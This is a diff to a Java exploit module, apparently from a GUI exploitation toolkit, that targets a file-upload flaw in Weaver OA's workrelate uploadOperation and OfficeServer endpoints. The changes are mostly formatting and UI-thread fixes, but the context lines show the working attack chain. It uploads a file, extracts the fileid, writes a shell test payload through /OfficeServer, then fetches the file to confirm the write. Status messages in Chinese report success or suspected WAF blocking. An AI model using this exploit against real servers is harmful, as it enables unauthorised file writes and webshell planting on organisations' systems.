@@ -1,9 +1,11 @@
 package exp.oa.weaveroa;
 
 import core.Exploitlnterface;
+
 import java.util.HashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
 import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
@@ -44,8 +46,9 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
 
 
         if (post.getCode() == 200 && post.getText().contains("&fileid=")) {
-
-            textArea.appendText("\n fileid获取成功 开始释放");
+            Platform.runLater(() -> {
+                textArea.appendText("\n fileid获取成功 开始释放");
+            });
             //使用正则表达式抓取filedid
             Pattern pattern = Pattern.compile("fileid=\\d+");
             Matcher matcher = pattern.matcher(post.getText().trim());
@@ -63,25 +66,25 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
 
             Response sec = HttpTools.post(url + "/OfficeServer", sec_post, this.headers, "utf-8");
             if (sec.getCode() == 200 && sec.getText().contains(shell.test_payload)) {
-                Platform.runLater(()->{
+                Platform.runLater(() -> {
                     textArea.appendText("\n 释放成功 检测写入状态");
                 });
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
 
                 if (thired.getText().contains(shell.test_payload)) {
-                    Platform.runLater(()->{
+                    Platform.runLater(() -> {
                         textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
                     });
                     return true;
                 } else {
-                    Platform.runLater(()->{
+                    Platform.runLater(() -> {
                         textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
                     });
                     return false;
                 }
 
             } else {
-                Platform.runLater(()->{
+                Platform.runLater(() -> {
                     textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
                 });
                 return false;
@@ -89,7 +92,7 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface {
 
 
         } else {
-            Platform.runLater(()->{
+            Platform.runLater(() -> {
                 textArea.appendText("\n weaveroa_workrelate_uploadOperation - 漏洞不存在 (出现误报请联系作者)");
             });
             return false;
